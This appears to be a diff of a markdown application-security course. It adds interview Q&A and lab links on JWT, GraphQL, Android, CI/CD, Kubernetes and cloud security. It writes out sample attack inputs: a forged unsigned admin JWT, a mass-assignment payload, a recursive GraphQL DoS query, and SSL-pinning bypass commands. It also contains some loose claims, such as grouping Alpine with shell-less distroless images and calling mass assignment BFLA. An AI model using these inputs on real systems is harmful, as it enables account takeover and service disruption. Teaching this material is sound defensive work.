@@ -2017,7 +2238,6 @@ def get_user(user_id: int, current_user: User = Depends(get_current_user)):
 <details><summary>🎤 Interview Q: How do you prevent BOLA at a structural level?</summary>
 **Answer:** Beyond simple authorization checks, use non-sequential, hard-to-guess IDs like UUIDv4. Implement a robust authorization layer (like ABAC or RBAC) that intercepts every request and validates ownership before hitting the business logic.
 </details>
-
 
 ### 2. Broken Authentication
 **What it is:** Weaknesses in the authentication mechanisms, such as weak password policies, lack of rate limiting on login, or improperly configured JWTs.
@@ -2058,7 +2278,7 @@ app.post('/profile', (req, res) => {
 
 ### 5. BFLA (Broken Function Level Authorization)
 **What it is:** Users can access administrative functions by changing the HTTP method or URL path.
-**Why it happens:** Missing authorization checks at the routing/function level.
+**Why it happens:** Missing authorization checks at the routing/function level. For real-world examples, you can search [HackerOne Hacktivity for BOLA and BFLA disclosures](https://hackerone.com/hacktivity?querystring=BOLA).
 
 **BOLA vs BFLA**
 | Feature | BOLA | BFLA |
@@ -2090,10 +2310,9 @@ app.post('/profile', (req, res) => {
 
 ### API Recon and Doc Discovery
 - Look for `/swagger.json`, `/openapi.json`, `/api-docs`, `/v1/`, `/v2/`.
-- Use tools like Kiterunner or ffuf to brute-force API paths.
 
 ### JWT Attacks — DEEP DIVE
-JSON Web Tokens (JWT) consist of Header.Payload.Signature.
+JSON Web Tokens (JWT) consist of Header.Payload.Signature. For hands-on practice, I highly recommend completing the [PortSwigger Web Security Academy JWT labs](https://portswigger.net/web-security/jwt) and [OAuth authentication labs](https://portswigger.net/web-security/oauth).
 
 **1. None Algorithm Attack**
 - **Flow:** Attacker changes the header `{"alg": "RS256"}` to `{"alg": "none"}`. They modify the payload (e.g., `role: admin`), remove the signature, and send the token: `eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.`
@@ -2142,8 +2361,52 @@ query {
 
 ---
 
+## 5. 🎤 Deep Technical Interview Questions & Answers
+
+<details>
+<summary><strong>Q5: Why is Mass Assignment (Property Binding / BFLA) so ubiquitous in modern REST and GraphQL APIs, and how should Data Transfer Objects (DTOs) be structured to eliminate it?</strong></summary>
+<strong>Model Answer:</strong><br>
+Modern application ORM frameworks and serialization controllers (such as Ruby on Rails strong parameters, Spring Boot Jackson bindings, or ASP.NET model binding) default to automatically mapping every incoming JSON request payload key directly onto internal database persistent entity model attributes to accelerate developer productivity. 
+When an API endpoint handles a standard profile modification POST request (`{"username": "jdoe", "email": "j@doe.com"}`), an attacker attempting a **Mass Assignment** exploit introduces internal privilege parameters directly into the JSON dictionary: `{"username": "jdoe", "email": "j@doe.com", "role": "admin", "account_balance": 999999}`. Because the naive backend controller automatically binds incoming JSON keys directly into internal User database models, the injected properties overwrite system authentication attributes instantly!
+**Remediation:** Developers must abandon binding raw database ORM Entity models directly to network interaction endpoints. Instead, design dedicated, decoupled **Data Transfer Objects (DTOs)** or rigorous schema verification allowlists (e.g., Pydantic models in Python, Zod in TypeScript) that explicitly declare ONLY those writable field properties intended for client modification, completely ignoring or rejecting any unverified extraneous parameters.
+</details>
+
+<details>
+<summary><strong>Q6: In API rate limiting architectures, explain the technical operational differences between Token Bucket, Leaky Bucket, and Sliding Window counter algorithms when defending against automated brute-force attempts.</strong></summary>
+<strong>Model Answer:</strong><br>
+When hardening APIs against automated stuffing or exhaustion attacks, edge routing infrastructures (Kong, AWS API Gateway, Nginx) apply distinct algorithmic traffic metering constructs:
+1. **Token Bucket:** The bucket possesses a defined fixed maximum token capacity (e.g., 100 tokens) and fills continuously at a steady token generation rate (e.g., 10 tokens/second). Each incoming API request extracts exactly one token; if zero tokens remain present, the request immediately terminates with `429 Too Many Requests`. This structure excels at accommodating predictable, short-duration legitimate user **burst traffic** while restricting sustained high-rate abusive harvesting.
+2. **Leaky Bucket:** Incoming user requests fill an intermediary processing queue buffer of fixed overall memory capacity and continuously empty (process out toward backend application microservices) strictly at a constant, uniform execution rate. If sudden traffic volumes overflow maximum queue depth, surplus incoming requests drop immediately. This enforces absolute mathematical output traffic smoothness, safeguarding fragile legacy backend processing services against overwhelming traffic surges.
+3. **Sliding Window Counter:** Unlike simplistic static time-window algorithms (which reset counters completely upon exact hourly boundaries, permitting attackers to exhaust 100% quota in the concluding second of Minute 1 and 100% quota instantly in second 0 of Minute 2), a sliding window dynamically weights current request frequency against proportional volume consumed throughout the overlapping trailing temporal period, eliminating boundary-surge quota evaluation vulnerabilities.
+</details>
+
+<details>
+<summary><strong>Q7: When assessing GraphQL endpoints, how do Introspection query abuses and deeply nested query exhaustion attacks function, and what depth-limiting controls must engineers enforce?</strong></summary>
+<strong>Model Answer:</strong><br>
+Unlike traditional RESTful routing architectures containing discrete static URLs, **GraphQL** exposes a centralized single execution schema endpoint (e.g., `/graphql`) capable of resolving arbitrary client data graph relationship requests.
+1. **Introspection Abuses:** GraphQL natively implements an **Introspection Schema System** (`__schema { types { name fields { name } } }`). When engineers mistakenly leave introspection enabled within production deployment tiers, any external tester can interrogate the endpoint to effortlessly extract an exhaustive structural dictionary detailing every internal data model, hidden mutation capability, administrative field variable, and custom data type across the enterprise architecture.
+2. **Nested Query Denial of Service (DoS):** GraphQL relationships frequently permit bidirectional cyclic data resolutions (such as a User possessing multiple Posts, where each Post natively lists its User author). An attacker abuses this cyclic relationship to formulate an exponentially recursive nested payload:
+```graphql
+query { author(id: 1) { posts { author { posts { author { posts { content } } } } } } }
+```
+When submitted, a single HTTP request forces the GraphQL resolution engine to initiate tens of thousands of recursive database execution queries, exhausting backend memory and CPU worker pools instantly!
+**Remediation:** Secure GraphQL architectures mandate disabling introspection endpoints entirely across production tiers, while enforcing strict **Max Query Depth Limiters** and quantitative **Query Complexity Cost Calculation Scopes** prior to executing any incoming database resolution routines.
+</details>
+
+<details>
+<summary><strong>Q8: Walk through how JSON Web Token (JWT) cryptographic implementation flaws—specifically algorithm confusion (RS256 to HS256) and None-algorithm acceptance—are executed during token manipulation assessments.</strong></summary>
+<strong>Model Answer:</strong><br>
+A JSON Web Token consists of three Base64URL-encoded strings separated by periods: the **Header** (identifying cryptographic algorithms), the **Payload** (containing session claims), and the **Signature** (verifying token integrity). Poorly written token evaluation libraries suffer from critical architectural parsing vulnerabilities:
+1. **The 'None' Algorithm Attack:** Legacy JWT verification parsing frameworks frequently accepted `"alg": "none"` within token headers to facilitate debugging workflows. An attacker decodes an captured low-privilege JWT, modifies the payload claims from `"user": "guest"` to `"user": "admin"`, alters the header to declare `{"alg": "none", "typ": "JWT"}`, and entirely deletes the trailing cryptographic signature string while retaining the terminating period separator (`header.payload.`). Vulnerable application servers evaluate the `"none"` algorithm flag and accept the forged administrative session without performing cryptographic validation checks!
+2. **RS256 to HS256 Algorithm Confusion:** Standard enterprise architectures sign tokens using **RS256 (Asymmetric RSA cryptography)**, where an authorization server signs tokens utilizing a secret RSA Private Key, and microservices verify signatures independently utilizing a publicly published RSA Public Key (retrieved via JWKS endpoints). 
+An algorithm confusion vulnerability occurs when an attacker manipulates a captured token header, changing the algorithm declaration from `"alg": "RS256"` to `"alg": "HS256" (Symmetric HMAC SHA-256 cryptography)`. The attacker subsequently re-signs the altered administrative token payload using the valid public RSA Public Key file content directly as the HMAC symmetric verification secret! When the receiving microservice evaluates the incoming token, it reads the manipulated `"HS256"` instruction and mistakenly executes symmetric HMAC signature verification against its locally stored RSA Public Key object—successfully validating the forged token!
+</details>
+
+
+---
+
 <a id="section-05_android_security"></a>
-# ANDROID APPLICATION SECURITY (Weeks 11-12)
+# 📱 05: Android Application Security & Reverse Engineering (Weeks 11-12)
 
 ## 1. Android Architecture
 
@@ -2167,7 +2430,7 @@ Android apps are built from four fundamental components:
 1.  **Activities:** The UI screens. (Vuln: Exported activities can be invoked by other apps to bypass authentication screens).
 2.  **Services:** Background workers. (Vuln: Exported services can be abused to perform background actions).
 3.  **BroadcastReceivers:** Listeners for system-wide events. (Vuln: Sniffing intents or injecting malicious intents).
-4.  **ContentProviders:** Data sharing mechanism between apps, backed by SQLite. (Vuln: SQL Injection, Path Traversal if exported improperly).
+4.  **ContentProviders:** Data sharing mechanism between apps, backed by SQLite. (Vuln: SQL Injection, Path Traversal if exported improperly). For a comprehensive guide on testing these components, refer to the [OWASP Mobile Application Security Testing Guide (MASTG)](https://mas.owasp.org/MASTG/) and [OWASP Mobile Application Security Verification Standard (MASVS)](https://mas.owasp.org/MASVS/).
 
 ### APK Structure
 An APK is just a ZIP file.
@@ -2207,7 +2470,7 @@ An APK is just a ZIP file.
 1.  `android:debuggable="true"`: If true, the app can be attached to a debugger (critical finding).
 2.  `android:allowBackup="true"`: Data can be extracted via `adb backup` without root.
 3.  `android:exported="true"`: Is this component accessible to other apps?
-4.  **Custom Permissions:** Are they implemented correctly with appropriate `protectionLevel`?
+4.  **Custom Permissions:** Are they implemented correctly with appropriate `protectionLevel`? If you prefer reading community write-ups, [HackTricks Android App Pentesting](https://book.hacktricks.xyz/mobile-pentesting/android-app-pentesting) is a fantastic cheat sheet.
 
 <details><summary>🎤 Interview Q: What do you look for in AndroidManifest.xml?</summary>
 **Answer:** I look for security misconfigurations. First, I check `android:debuggable` and `android:allowBackup` flags. Then, I look at the permissions requested to see if they follow the principle of least privilege. Most importantly, I map out all exported components (`android:exported="true"`)—Activities, Services, Broadcast Receivers, and Content Providers—because these represent the attack surface where other malicious apps on the device can interact with our app.
@@ -2235,6 +2498,7 @@ grep -Ri "password" ./jadx_output_dir/
 objection -g com.example.app explore
 android sslpinning disable
 ```
+For visual learners, NahamSec's intro to mobile hacking covers SSL pinning bypass techniques nicely.
 
 ### Local Storage Analysis
 **Internal Storage:** (`/data/data/com.package.name/`)
@@ -2258,7 +2522,7 @@ android sslpinning disable
 **What it is:** WebView is an embedded browser inside the app.
 **Vulnerabilities:**
 1.  **JavaScript Interface Injection:** Using `addJavascriptInterface`, Java objects are exposed to JavaScript. If the WebView loads a malicious URL, the attacker's JS can execute Java methods, potentially leading to RCE.
-2.  **File Access:** If `setAllowFileAccess(true)` is enabled, malicious JS can read local files (`file:///data/data/com.app/...`).
+2.  **File Access:** If `setAllowFileAccess(true)` is enabled, malicious JS can read local files (`file:///data/data/com.app/...`). You can find many real-world examples of insecure WebView configurations in Bugcrowd and HackerOne disclosures.
 
 **Code Example:**
 ```java
@@ -2296,8 +2560,43 @@ adb shell am start -n com.example.app/.ChangePasswordActivity
 
 ---
 
+## 7. 🎤 Deep Technical Interview Questions & Answers
+
+<details>
+<summary><strong>Q4: Walk through the architectural mechanism of Android SSL/TLS Certificate Pinning, and explain how dynamic instrumentation toolkits like Frida inject runtime evaluation hooks to bypass pinning during mobile security assessments.</strong></summary>
+<strong>Model Answer:</strong><br>
+Standard Android TLS verification relies exclusively on system-wide operating system root certificate authority trust stores. If an enterprise app authenticates solely via standard system OS trust certificates, an analyst can effortlessly intercept encrypted traffic simply by installing a local Burp Suite interception Root CA directly onto the user certificate store. 
+To thwart interception and thwart MITM exploitation, high-security banking and fintech applications implement **Certificate Pinning**: embedding the cryptographic public key hash, peer certificate fingerprint, or complete CA public key directly into application compiled binary bundles (via Android Network Security Config XML or OkHttp certificate pinning structures). During initial TLS handshake handoff, the app ignores system CA trust entirely, aborting connections immediately if remote server certificates fail to match locally hardcoded pinned fingerprints!
+**Bypassing via Frida Dynamic Instrumentation:** Because certificate pinning enforcement logic ultimately compiles down into standard bytecode memory verification routines running inside the Java Virtual Machine / ART runtime, pinning logic remains completely vulnerable to memory manipulation on rooted architectures. **Frida** injects dynamic JavaScript hook frameworks directly into running mobile application memory processes. By hooking core HTTPS networking libraries (such as `javax.net.ssl.TrustManager` or OkHttp verification constructors), Frida dynamically overwrites runtime return structures—forcing certificate validation validation checking routines to consistently return `true` or jump past execution exceptions regardless of presenting invalid interception certificates!
+</details>
+
+<details>
+<summary><strong>Q5: What critical exposure risks emerge when developers persist authentication tokens within Android SharedPreferences, and how does utilizing Android Keystore / EncryptedSharedPreferences mitigate filesystem extraction?</strong></summary>
+<strong>Model Answer:</strong><br>
+When developers save session credentials, OAuth refresh tokens, or user passwords using standard Android `SharedPreferences`, the OS serializes these properties directly into completely unencrypted plaintext XML storage files located inside application internal sandboxed storage directories (`/data/data/<package_name>/shared_prefs/<xml_file>`). On default unrooted customer handsets, operating system user ID sandbox isolation prevents rival applications from accessing these private directories. However, if a user operates an unlocked/rooted device, experiences physical forensic imaging, or if the target application suffers from a secondary path-traversal / backups misconfiguration (`android:allowBackup="true"`), external attackers can immediately harvest plaintext authentication tokens directly off filesystem directories!
+**Remediation via EncryptedSharedPreferences & Android Keystore:** High-security mobile applications must utilize **EncryptedSharedPreferences** (part of Google’s AndroidX Security library). This framework automatically applies authenticated symmetric cryptographic encryption (**AES-256-GCM** for data values and **AES-256-SIV** for preference keys) before writing anything to filesystem XML documents. Crucially, the foundational symmetric Master Cryptographic Encryption Key is never stored on standard storage media; it is generated within and safeguarded directly by the **Android Keystore System**—a protected hardware-isolated secure execution environment (Trusted Execution Environment / TEE or specialized Titan M security processing chips) where private cryptographic keys remain strictly inaccessible to OS user memory or filesystem harvesting attempts.
+</details>
+
+<details>
+<summary><strong>Q6: How do misconfigured exported Android IPC (Inter-Process Communication) components—such as Activities, Services, and Broadcast Receivers—expose apps to cross-application intent hijacking or privilege escalation on standard devices?</strong></summary>
+<strong>Model Answer:</strong><br>
+Android OS architectures rely on **Intents** and **Android Components** (Activities, Services, Broadcast Receivers, and Content Providers) to manage Inter-Process Communication (IPC). Whenever an application manifest file explicitly declares a component with an attached `<intent-filter>` (or manually defines `android:exported="true"` without defining tight customized system syntax permission rules), that specialized internal application execution component becomes publicly callable by ANY external third-party application running concurrently upon the user's phone!
+1. **Exported Activity Privilege Elevation:** If a fintech application exports an internal sensitive screen (like `TransferConfirmationActivity` or `AdminSettingsActivity`) without requiring user permission attributes, a malicious third-party flashlight app can instantiate an explicit incoming intent directly launching that privileged activity—completely bypassing biometric login barriers and traditional authentication PIN workflows!
+2. **Broadcast Receiver Data Hijacking:** If an application transmits sensitive transaction state updates or verification tokens via implicit wide-area broadcasts (`sendBroadcast(intent)` instead of explicit app-targeted deliveries or LocalBroadcastManager constructs), any running adversarial background application capable of registering matching intent receiver hooks can passively eavesdrop on inter-application financial transmissions without triggering OS security alerts!
+</details>
+
+<details>
+<summary><strong>Q7: Explain the operational distinction between Static Application Security Analysis of compiled APK binaries (using tools like JADX and apktool) versus interactive Dynamic Execution assessment (utilizing Objection or Frida on rooted instrumentation platforms).</strong></summary>
+<strong>Model Answer:</strong><br>
+**Static APK Analysis** inspects application installation payloads entirely at rest without actually executing binary execution sequences upon mobile hardware. Utilizing tools like **apktool**, analysts unwrap APK storage envelopes to examine asset configurations, manifest XML declarations, and embedded native library resources. Utilizing Java decompilers like **JADX**, binary Dalvik Executable classes (`classes.dex`) translate directly back into readable Java/Kotlin source code representations. Static examination excels at discovering hardcoded developer API secrets, unencrypted SQLite database schemas, vulnerable imported SDK dependencies, and exposed IPC manifests. However, static methods fail completely when encountering professional commercial binary obfuscation frameworks (such as ProGuard or DexGuard) or dynamic runtime native C++ NDK decryption routines.
+**Dynamic Execution Analysis** evaluates application behavior during real-time runtime execution upon physical rooted smartphones or emulated virtual device architectures. By attaching interactive runtime instrumentation suites like **Objection** and **Frida**, AppSec researchers bypass root detection alarms, disable TLS certificate pinning on the fly, intercept real-time memory parameter transformations, monitor decrypted filesystem I/O file reads, and evaluate live cryptographic memory state before obfuscation engines can mask payload mechanics!
+</details>
+
+
+---
+
 <a id="section-06_sast_sca"></a>
-# 06 SAST AND SCA (Weeks 13-14)
+# 🔍 06: SAST, SCA & Supply Chain Security (Weeks 13-14)
 
 ## 1. Static Application Security Testing (SAST)
 
@@ -2353,14 +2652,13 @@ A false positive (FP) is when a tool flags a non-existent vulnerability.
 
 ---
 
-
 ## 2. Free SAST Tools — Hands-On
 
 ### Semgrep
 Semgrep is a fast, open-source, static analysis tool. It's incredibly popular because its rules look exactly like the code you are searching for.
 
 * **Installation:** `pip install semgrep` or `brew install semgrep`
-* **Scanning:** `semgrep scan --config="p/default" .`
+* **Scanning:** `semgrep scan --config="p/default" .` To practice writing your own rules, try the interactive [Semgrep Playground](https://semgrep.dev/playground).
 
 **Writing Custom Rules:**
 Let's say you want to ban the use of `eval()` in Python.
@@ -2535,7 +2833,6 @@ Modern applications are often 80% open-source libraries and 20% custom code. If 
 
 ### Open-Source Risk and Supply Chain Attacks
 * **Log4Shell (CVE-2021-44228):** A critical vulnerability in the widely used Java logging library `log4j`. It allowed unauthenticated Remote Code Execution (RCE) simply by logging a specific string. This broke the internet because *everyone* used log4j.
-* **Malicious Packages (event-stream, ua-parser-js):** Sometimes, attackers compromise the maintainer's account of a popular library or use "Typosquatting" (naming a malicious package `requets` instead of `requests`). They inject malicious code that steals environment variables or installs cryptominers.
 
 ### CVE, NVD, and GHSA
 * **CVE (Common Vulnerabilities and Exposures):** A dictionary of publicly known cybersecurity vulnerabilities. Every disclosed vulnerability gets a unique ID (e.g., CVE-2021-44228).
@@ -2553,7 +2850,7 @@ Modern applications are often 80% open-source libraries and 20% custom code. If 
 ### OWASP Dependency-Check
 A robust, open-source SCA tool that analyzes dependencies and cross-references them against the NVD.
 * **Pros:** Free, integrates well with build tools (Maven, Gradle).
-* **Cons:** Can be slow to download the NVD database initially; high false positive rate compared to commercial tools.
+* **Cons:** Can be slow to download the NVD database initially; high false positive rate compared to commercial tools. You can learn how to set it up in your pipeline through the [OWASP Dependency-Check documentation](https://jeremylong.github.io/DependencyCheck/).
 
 ### npm audit / pip audit
 Built-in tools for Node.js and Python ecosystems.
@@ -2660,7 +2957,7 @@ Third, and most importantly, I look for patterns. If the tool is consistently fa
 ---
 
 <a id="section-07_devsecops"></a>
-# 07 DEVSECOPS PRACTICES (Weeks 15-16)
+# 🚀 07: DevSecOps Practices & CI/CD Pipelines (Weeks 15-16)
 
 ## 1. DevSecOps Fundamentals
 
@@ -2763,12 +3060,11 @@ Even with policies, developers accidentally commit secrets. Secret scanners look
 * **Docker Best Practices:**
   * Use minimal base images (e.g., Alpine or distroless) to reduce the attack surface.
   * Never run containers as `root`. Specify a `USER` in the Dockerfile.
-  * Do not hardcode secrets in the Dockerfile.
 * **Image Scanning:** Use tools like Trivy or Clair to scan the built Docker image for OS-level vulnerabilities before pushing it to the registry.
 
 ### IaC Security Awareness
 Infrastructure as Code (Terraform, CloudFormation) defines your cloud environment. Misconfigurations here are catastrophic.
-* **Tools:** Checkov, tfsec. These scan your `.tf` files to ensure you aren't deploying public S3 buckets or unencrypted databases.
+* **Tools:** Checkov, tfsec. These scan your `.tf` files to ensure you aren't deploying public S3 buckets or unencrypted databases. For setting up CI/CD security, the [GitHub Actions Security Documentation](https://docs.github.com/en/actions/security-guides) is an excellent resource.
 
 ### 🔬 Lab: GitHub Actions with Scanning
 Create a GitHub Action that runs Semgrep (SAST), Trivy (SCA/Container), and TruffleHog (Secrets) on every Pull Request. Set the pipeline to fail if critical vulnerabilities are found.
@@ -2856,8 +3152,1345 @@ Large Language Models (LLMs) introduce new attack surfaces.
 
 ---
 
-<a id="section-08_interview_prep"></a>
-# 08 INTERVIEW PREPARATION + COMPANY PATTERNS
+## 8. 🎤 Deep Technical Interview Questions & Answers
+
+<details>
+<summary><strong>Q3: How do common Kubernetes (K8s) Cluster misconfigurations—specifically deploying pods with default `automountServiceAccountToken: true` or exposed Kubelet read-only APIs—enable complete lateral compromise across container orchestration infrastructures?</strong></summary>
+<strong>Model Answer:</strong><br>
+When container microservices run within a standard Kubernetes deployment cluster, Kubernetes defaults to deploying pods with **`automountServiceAccountToken: true`** enabled unless explicitly overridden by engineers. Consequently, the K8s API server automatically mounts a cryptographically signed Service Account JWT access token directly into a standard standardized filesystem directory inside every running container pod: `/var/run/secrets/kubernetes.io/serviceaccount/token`. 
+If an external attacker successfully exploits a minor Local File Inclusion (LFI), command injection, or path-traversal vulnerability within an otherwise unprivileged front-end container web app, they can immediately harvest this mounted bearer token from disk! If cluster administrators assigned permissive Role-Based Access Control (RBAC) privileges to that container's default Service Account (such as permission to query cluster namespaces or instantiate exec terminal sessions into neighboring nodes), the attacker passes the stolen token directly to the internal Kubernetes Master API server—effortlessly executing lateral movement across isolated production environments!
+**Remediation:** Enforce strict RBAC least-privilege scoping across all cluster deployments, set `automountServiceAccountToken: false` universally across frontend microservice pods that do not interact with K8s APIs directly, and restrict network accessibility over port 10250 (Kubelet HTTPS API) utilizing rigorous Node-level network policy rules.
+</details>
+
+<details>
+<summary><strong>Q4: During a CI/CD infrastructure security architecture review, what explicit engineering controls defend production engineering environments against Poisoned Pipeline Execution (PPE) and dependency confusion exploitation across automated automated runner infrastructures?</strong></summary>
+<strong>Model Answer:</strong><br>
+Automated CI/CD orchestration pipelines (such as GitHub Actions, GitLab CI/CD, or Jenkins) represent critical organizational high-value infrastructure targets; compromising build pipelines enables automated backdoor injection directly into software release artifacts without modifying developer source code directly.
+1. **Defending against Poisoned Pipeline Execution (PPE):** PPE occurs when build runners blindly execute arbitrary build workflow configuration file instructions (like `.github/workflows/build.yml`) supplied directly within unverified public pull requests submitted by external repository contributors! To neutralize PPE vectors, DevSecOps engineers must configure repository protection policies requiring explicit maintainer review approval before initiating CI test builds from external forks, execute CI build scripts strictly inside isolated ephemeral, non-privileged Docker execution containers, and enforce strict token scope restriction—preventing automated build runners from accessing deployment repository production storage secrets during initial PR testing stages!
+2. **Defending against Dependency Confusion:** Dependency confusion abuses developer package manager resolution routines (npm, pip, Maven). When enterprise code bases reference internal proprietary library packages (e.g., `@myorg/custom-crypto`), package tools evaluate both internal private enterprise artifact repos and public global registries (such as public npmjs.com). An attacker registers an identically named malicious package directly onto public global package indexers featuring an exceptionally high release version number (v99.0.0). Because naive package managers default to installing whichever discovered repository contains the highest numerical release version, developer workstations and automated CI runners download the public malicious code instantly! To eliminate dependency confusion, explicitly scope internal packages strictly to internal enterprise registry domain endpoints within package config files (`.npmrc`, `pip.conf`), and utilize lockfile verification checking cryptographic integrity hashes prior to library integration.
+</details>
+
+<details>
+<summary><strong>Q5: Explain the operational and defensive security advantages of implementing immutable production microservice containers utilizing lightweight base operating systems (such as Distroless or Alpine Linux) and stripping interactive shells prior to production staging.</strong></summary>
+<strong>Model Answer:</strong><br>
+Legacy containerization deployments routinely built production microservices directly upon massive, fully featured general-purpose operating system base images (such as standard Ubuntu, CentOS, or Debian Docker images). While convenient, these hefty base layers bundle hundreds of unneeded system utilities, network compilers, diagnostic suites, and shell command evaluators (like `bash`, `curl`, `python3`, `apt-get`, and `netcat`). When an attacker achieves an initial command execution break-in within a container running upon a standard OS image, they leverage these existing bundled diagnostic programs as "Living-off-the-Land" (LotL) offensive exploration toolkits to instantly assemble back-connect shells, port-scan internal container subnets, and download secondary exploitation frameworks!
+**The Distroless / Immutable Advantage:** Adopting lightweight, stripped base images—such as **Google's Distroless** frameworks or hyper-minimal **Alpine Linux** architectures—dramatically compresses container attack surfaces. Distroless images encapsulate strictly the exact compiled application binary dependencies and minimal core system libraries required for standard execution; they completely omit package managers (`apt`, `apk`), terminal command shells (`/bin/sh`, `/bin/bash`), and network discovery tooling! Even if an attacker succeeds in exploiting an application remote evaluation vulnerability within a Distroless production container, their injected shell commands fail instantly upon memory execution because absolutely zero OS execution binaries exist on disk to interpret or invoke the instruction payloads!
+</details>
+
+<details>
+<summary><strong>Q6: How does deploying automated Infrastructure as Code (IaC) static syntax evaluation tooling (using suites like Checkov, Tfsec, or Open Policy Agent) inside pre-commit and pre-merge CI workflows protect against cloud security drift and zero-day exposure?</strong></summary>
+<strong>Model Answer:</strong><br>
+In enterprise DevSecOps operations, cloud real estate (AWS Virtual Private Clouds, Security Groups, IAM Role bindings, Kubernetes Cluster architectures) is rarely deployed via manual dashboard clicking; it is programmed and provisioned systematically using **Infrastructure as Code (IaC)** tools like HashiCorp Terraform, AWS CloudFormation, or Kubernetes Helm charts. If security engineering evaluations occur strictly after infrastructure resources instantiate within production runtime accounts, vulnerability scanners merely report active production exposures—meaning public S3 buckets, open security SSH ports (`0.0.0.0/0 on TCP 22`), or public database endpoints already exist unprotected upon public IP routing infrastructures!
+**Shift-Left IaC Enforcement:** Integrating specialized IaC security verification engines (such as **Checkov**, **Tfsec**, or custom Rego policies running under **Open Policy Agent / OPA**) directly into local pre-commit developer git hooks and automated GitHub PR evaluation pipelines stops infrastructure flaws before instantiation occurs! Whenever an engineer submits an infrastructure code modification attempting to provision an unencrypted RDS DB instance, disable S3 bucket public access blocks, or assign wildcard IAM roles (`"Resource": "*"`), the automated automated CI execution hook intercepts the proposed IaC structural blueprint, identifies the architecture security rule deviation, and instantly blocks repository merge authorization—guaranteeing completely that unhardened cloud configurations fail to ever reach production deployment accounts!
+</details>
+
+
+---
+
+<a id="section-08_cloud_advanced"></a>
+# ☁️ 08: Advanced Topics, AWS & Cloud Security (Weeks 17-18)
+
+Welcome to the final frontier. This section covers the advanced, modern attacks that separate entry-level analysts from top-tier AppSec Engineers at product companies like Razorpay, CRED, Flipkart, and global MNCs. 
+
+---
+
+## 1. Cloud Security Basics for AppSec (AWS Focus)
+
+Modern applications are hosted in the cloud. As an AppSec engineer, you must understand how web vulnerabilities escalate into full cloud compromise. While we focus heavily on AWS (as it's dominant in the Indian startup ecosystem), the concepts apply to GCP and Azure as well.
+
+### 🎯 SSRF to Cloud Metadata Compromise
+**What it is:** When an application is vulnerable to Server-Side Request Forgery (SSRF), an attacker can force the server to make requests to internal IP addresses. In a cloud environment, the most dangerous IP is the **Instance Metadata Service (IMDS)** at `169.254.169.254`.
+
+- **GCP/Azure Context:** Similar services exist (e.g., GCP requires a `Metadata-Flavor: Google` header, making basic SSRF harder to exploit).
+
+**Mitigation (AWS IMDSv2):** 
+AWS introduced IMDSv2, which requires the client to first fetch a session token via a `PUT` request with a specific header (`X-aws-ec2-metadata-token-ttl-seconds`). Since standard SSRF usually only controls `GET` requests and cannot inject custom headers, IMDSv2 effectively kills this attack vector.
+
+### 🪣 S3 Bucket Misconfigurations
+**What it is:** Amazon S3 (Simple Storage Service) buckets are often misconfigured to allow public read or write access.
+- **Public Read:** Leads to massive data leaks (PII, source code, backups).
+- **Public Write:** Attackers can overwrite files. If the bucket hosts JavaScript files for a website, an attacker can overwrite them to achieve **Stored XSS** across the entire application (Supply Chain Attack).
+- **Subdomain Takeover (Dangling DNS):** If a company points `assets.shop.com` to an S3 bucket (`shop-assets-123.s3.amazonaws.com`), but later deletes the bucket without removing the DNS record, an attacker can create a bucket with the exact same name and take over the subdomain.
+
+### 🔑 IAM Privilege Escalation
+**What it is:** Identity and Access Management (IAM) defines who can do what. If an application (or stolen token) has overly permissive policies (e.g., `iam:PutUserPolicy`), an attacker can grant themselves Admin access.
+
+To practice finding and exploiting these exact AWS misconfigurations, work through the incredibly popular [flaws.cloud](http://flaws.cloud/) and [flaws2.cloud](http://flaws2.cloud/) interactive labs.
+
+<details>
+<summary><b>🎤 Interview Q: How would you prevent SSRF from escalating to a cloud compromise?</b></summary>
+<b>Answer:</b> 
+1. Enforce IMDSv2 across all AWS instances, which blocks simple GET-based SSRF by requiring a PUT token. 
+2. Apply the Principle of Least Privilege to the EC2 IAM role so even if keys are stolen, they cannot access sensitive data like S3 or databases.
+3. Use a strict egress firewall or proxy to prevent the server from connecting to `169.254.169.254`.
+</details>
+
+---
+
+## 2. Business Logic & Fintech Vulnerabilities
+
+For companies handling money, business logic flaws are often more critical than technical injection flaws.
+
+### 🏎️ Race Conditions (TOCTOU - Time of Check to Time of Use)
+**What it is:** A concurrency flaw where multiple requests hit the server at the exact same millisecond. The server checks a condition (e.g., "does the user have enough balance?") for all requests simultaneously *before* it updates the database for any of them.
+
+**Code-Level Example (Node.js/Python logic):**
+Imagine a user with ₹100 balance attempting to transfer ₹100. They use Burp Suite to send 5 requests at the exact same time.
+
+```javascript
+// ❌ VULNERABLE CODE (No locking)
+async function transferMoney(userId, amount) {
+    // Check: Database reads balance
+    const account = await db.query('SELECT balance FROM accounts WHERE id = ?', [userId]);
+    
+    if (account.balance >= amount) {
+        // Attackers send 5 requests simultaneously.
+        // ALL 5 requests hit this IF condition before the UPDATE happens!
+        
+        // Use: Database updates balance
+        const newBalance = account.balance - amount;
+        await db.query('UPDATE accounts SET balance = ? WHERE id = ?', [newBalance, userId]);
+        return "Transfer successful";
+    }
+    return "Insufficient funds";
+}
+```
+
+**Result:** The attacker transfers ₹500 even though they only had ₹100. To see real-world impact, search for [Race Condition reports on HackerOne Hacktivity](https://hackerone.com/hacktivity?querystring=race%20condition).
+
+**Mitigation (Database Locking):**
+Use Pessimistic Locking (e.g., `SELECT ... FOR UPDATE` in SQL) or Optimistic Locking (version columns).
+
+```javascript
+// ✅ SECURE CODE (Pessimistic Locking)
+async function transferMoney(userId, amount) {
+    // BEGIN TRANSACTION
+    // SELECT ... FOR UPDATE locks the row. Other concurrent requests must wait in a queue.
+    const account = await db.query('SELECT balance FROM accounts WHERE id = ? FOR UPDATE', [userId]);
+    
+    if (account.balance >= amount) {
+        const newBalance = account.balance - amount;
+        await db.query('UPDATE accounts SET balance = ? WHERE id = ?', [newBalance, userId]);
+        // COMMIT TRANSACTION (Row is unlocked)
+        return "Transfer successful";
+    }
+    return "Insufficient funds";
+}
+```
+
+### 💸 Parameter Tampering & Price Manipulation
+**What it is:** Attackers modify hidden fields or intercept traffic to change the price of an item or the quantity before checkout.
+- **Exploit:** Changing `price=100` to `price=1` in the POST request.
+- **Negative Values:** Sending `quantity=-1` to force the system to *refund* money instead of charging it.
+- **Mitigation:** Never trust the client for pricing. The server must recalculate the total cost based on the internal product database using the `product_id`.
+
+Master these concepts by practicing the [PortSwigger Web Security Academy Business Logic Labs](https://portswigger.net/web-security/logic-flaws) and following along with Rana Khalil's Business Logic Video Walkthroughs.
